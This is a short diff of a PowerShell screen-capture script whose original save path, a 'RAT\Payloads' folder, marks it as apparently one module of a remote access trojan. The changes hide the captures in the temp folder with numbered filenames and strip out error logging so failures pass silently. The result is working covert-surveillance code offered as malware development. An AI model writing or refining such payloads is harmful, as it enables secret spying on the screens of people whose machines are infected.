@@ -2,7 +2,10 @@
 # Description: Captures the entire virtual screen (all monitors) and saves it to a public folder.
 
 # Define the output path for the screenshot
-$outputPath = "C:\Users\Ezer\Desktop\RAT\Payloads\LuckyShot"
+$outputPath = "$env:temp\LuckyCapture"
+while (Test-Path "${outputPath}${c}.jpg") {
+            $c++
+        }
 
 # Load the required .NET assemblies for graphics and forms
 # The Add-Type command might fail if already loaded, so we suppress errors.
@@ -27,16 +30,11 @@ try {
     $graphics.CopyFromScreen($screenLeft, $screenTop, 0, 0, $bitmap.Size)
 
     # Save the bitmap to the specified file path as a PNG
-    $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $bitmap.Save("$outputPath${c}.jpg", [System.Drawing.Imaging.ImageFormat]::Png)
 
     # Clean up resources
     $graphics.Dispose()
     $bitmap.Dispose()
-
-    # Optional: Write a success message to a log file for debugging
-    # "Success: " + (Get-Date) | Out-File C:\Users\Public\Documents\capture_log.txt -Append
 }
 catch {
-    # If something goes wrong, write the error to a log file
-    $_.Exception.Message + " at " + (Get-Date) | Out-File C:\Users\Public\Documents\capture_log.txt -Append
 }
